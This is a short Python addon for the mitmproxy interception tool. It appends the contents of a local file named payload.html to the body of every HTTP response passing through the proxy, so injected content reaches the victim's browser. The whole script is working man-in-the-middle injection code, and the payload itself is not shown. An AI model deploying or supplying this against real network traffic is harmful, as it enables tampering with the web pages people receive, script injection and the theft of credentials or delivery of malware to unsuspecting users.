from mitmproxy import http
def response(flow: http.HTTPFlow) -> None:
    if flow.response and flow.response.content:
        # The flow.response.content variable contains any website code.
        # Any changes to that variable will be passed along to the browser.
        f = open('payload.html','rb').read()
        flow.response.content += f
        pass